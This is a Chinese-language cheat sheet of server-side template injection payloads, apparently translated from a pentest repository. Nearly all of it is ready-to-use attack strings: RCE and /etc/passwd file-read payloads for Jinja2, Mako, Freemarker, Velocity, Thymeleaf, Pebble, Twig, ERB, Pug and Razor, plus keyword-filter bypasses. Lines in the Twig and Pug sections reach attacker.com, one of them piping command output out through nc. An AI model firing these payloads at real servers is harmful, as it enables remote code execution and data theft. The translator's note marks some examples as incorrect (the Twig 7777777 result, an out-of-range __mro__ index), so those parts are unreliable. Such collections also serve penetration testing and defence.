<a id="-ssti-payloads-collection"></a>
# 🔥 SSTI（服务端模板注入）载荷合集

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./SSTI.tr.md) • [🇬🇷 Ελληνικά](./SSTI.el.md)

```
  ███████╗███████╗████████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔════╝╚══██╔══╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗███████╗   ██║   ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║╚════██║   ██║   ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║███████║   ██║   ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚══════╝   ╚═╝   ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
                             服务端模板注入        
```

---

<a id="-detection-payloads"></a>
## 🔍 检测载荷

<a id="universal-detection"></a>
### 通用检测
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
{{7*'7'}}
```

> 如果响应中出现 `49`，原文将其判断为存在 SSTI 漏洞！（判断限制见译注）

<a id="identify-template-engine"></a>
### 识别模板引擎
```
{{7*'7'}}         → Jinja2/Twig 返回 7777777
${7*7}            → Freemarker/Velocity
<%= 7*7 %>        → ERB (Ruby)
#{7*7}            → Pebble
*{7*7}            → Thymeleaf
```

---

<a id="-python-jinja2"></a>
## 🐍 Python (Jinja2)

<a id="detection"></a>
### 检测
```python
{{7*7}}
{{config}}
{{config.items()}}
{{self}}
{{request}}
```

<a id="rce-payloads"></a>
### 远程代码执行（RCE）载荷
```python
# 方法 1：config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# 方法 2：cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# 方法 3：MRO（方法解析顺序，原文称最常见）
{{''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate()}}

# 方法 4：lipsum
{{lipsum.__globals__.os.popen('id').read()}}

# 方法 5：Request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

<a id="read-files"></a>
### 读取文件
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}
```

<a id="filter-bypass"></a>
### 过滤绕过
```python
# 使用 attr 过滤器
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# 使用 join 过滤器  
{%set x=''|join('')|attr('__class__')%}

# 十六进制编码
{{''['\x5f\x5fclass\x5f\x5f']}}
```

---

<a id="-python-mako"></a>
## 🌿 Python (Mako)

```python
<%import os%>${os.popen("id").read()}
${self.module.cache.util.os.system("id")}
${self.template.module.cache.util.os.popen("id").read()}
```

---

<a id="-java-freemarker"></a>
## ☕ Java (Freemarker)

<a id="detection-1"></a>
### 检测
```java
${7*7}
${object.class}
<#assign s="freemarker.template.utility.Execute"?new()>${s("id")}
```

<a id="rce-payloads-1"></a>
### 远程代码执行（RCE）载荷
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder",["id"]).start()}
${"freemarker.template.utility.Execute"?new()("id")}
```

---

<a id="-java-velocity"></a>
## 🍃 Java (Velocity)

```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

<a id="simple"></a>
### 简单示例
```java
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

---

<a id="-java-thymeleaf"></a>
## 🌱 Java (Thymeleaf)

<a id="detection-2"></a>
### 检测
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

<a id="rce-payloads-2"></a>
### 远程代码执行（RCE）载荷
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
```

---

<a id="-java-pebble"></a>
## 🌸 Java (Pebble)

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}
```

---

<a id="-php-twig"></a>
## 🐦 PHP (Twig)

<a id="detection-3"></a>
### 检测
```php
{{7*7}}
{{7*'7'}}  → 7777777 (string multiplication)
{{dump(app)}}
{{_self}}
```

<a id="rce-payloads-3"></a>
### 远程代码执行（RCE）载荷
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{['id']|filter('system')}}

{{['id']|map('system')|join}}

{{_self.env.setCache("ftp://attacker.com:21")}}{{_self.env.loadTemplate("backdoor")}}
```

<a id="read-files-1"></a>
### 读取文件
```php
{{'/etc/passwd'|file_excerpt(1,-1)}}
```

---

<a id="-ruby-erb"></a>
## 💎 Ruby (ERB)

<a id="detection-4"></a>
### 检测
```ruby
<%= 7*7 %>
<%= self %>
```

<a id="rce-payloads-4"></a>
### 远程代码执行（RCE）载荷
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= require 'open3'; Open3.capture2('id') %>
```

---

<a id="-nodejs-jadepug"></a>
## 🟢 Node.js (Jade/Pug)

<a id="detection-5"></a>
### 检测
```javascript
#{7*7}
-var x = 1; p= x
```

<a id="rce-payloads-5"></a>
### 远程代码执行（RCE）载荷
```javascript
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}

-var x = root.process.mainModule.require
-x('child_process').exec('id | nc attacker.com 80')
```

---

<a id="-net-razor"></a>
## 🔷 .NET (Razor)

```csharp
@(7*7)
@{
    var p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c id";
    p.Start();
}
```

---

<a id="-quick-reference"></a>
## 📊 速查

| 模板引擎 | 检测 | RCE |
|-----------------|-----------|-----|
| Jinja2 | `{{7*7}}` | `{{config.__class__...}}` |
| Twig | `{{7*'7'}}` | `{{_self.env...}}` |
| Freemarker | `${7*7}` | `<#assign ex=...>` |
| Velocity | `$class.class` | `#set($rt=...)` |
| ERB | `<%= 7*7 %>` | `<%= system('id') %>` |
| Pug | `#{7*7}` | `#{global.process...}` |

---

<a id="-bypass-techniques"></a>
## 🛡️ 绕过技巧

<a id="blocked-keywords"></a>
### 关键词被过滤
```python
# 使用 request 参数
{{request.args.cmd}}?cmd=__class__

# 字符串拼接
{{''['__cla'+'ss__']}}

# 十六进制编码
{{''['\x5f\x5fclass\x5f\x5f']}}
```

<a id="blocked-brackets"></a>
### 方括号被过滤
```python
{%print(7*7)%}
```

---

<a id="-resources"></a>
## 📚 参考资料

- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

<p align="center">
  <b>🔥 SSTI 载荷库</b><br>
  <i>仅供学习使用！</i>
</p>

> 译注：单次响应出现 49 不足以证明 SSTI，需核实表达式确由服务端模板求值并排除普通文本响应。引擎识别示例中的结果并非全部正确：[Twig 的乘法运算](https://twig.symfony.com/doc/3.x/templates.html#math)执行数值运算，不能将 7777777 视为该示例的通用结果。固定 __subclasses__ 索引依赖环境；Python 3 的 str.__mro__ 通常只有 str 与 object，原文 __mro__[2] 示例越界。旧版 Twig API、模板沙箱与权限也会限制载荷，示例保持原样。
